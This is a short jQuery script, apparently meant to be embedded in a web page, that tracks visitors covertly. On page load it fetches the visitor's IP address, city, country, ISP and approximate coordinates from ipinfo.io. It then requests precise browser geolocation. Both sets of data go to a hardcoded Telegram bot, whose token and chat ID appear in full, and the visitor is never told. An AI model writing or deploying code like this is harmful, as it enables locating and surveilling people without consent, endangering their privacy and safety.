$(document).ready(function () {
  fetch(`https://ipinfo.io/json`)
  .then(response => {
    if (!response.ok) {
      throw new Error(response.status);
    }
    return response.json();
  })
  .then(data => {
    const message = `IP: ${data.ip}\nГород: ${data.city}\nСтрана: ${data.country}\nОрганизация: ${data.org}\nРегион: ${data.region}\nНеточная локация: ${data.loc}`;

    fetch(`https://api.telegram.org/bot8114030428:AAHsuJfIONLcoVFZrLaRGyww2GNgeQ2RBpg/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: "6325602757",
        text: message
      })
    });
  })
  .catch(error => {
    console.error(error);
  });

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const message = `Точная локация: ${latitude}, ${longitude}`;

        fetch(`https://api.telegram.org/bot8114030428:AAHsuJfIONLcoVFZrLaRGyww2GNgeQ2RBpg/sendMessage`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: "6325602757",
            text: message
          })
        });
      },
      (error) => {
        console.error("Ошибка при получении геолокации:", error.message);
      }
    );
  } else {
    console.log("Геолокация не поддерживается этим браузером.");
  }
});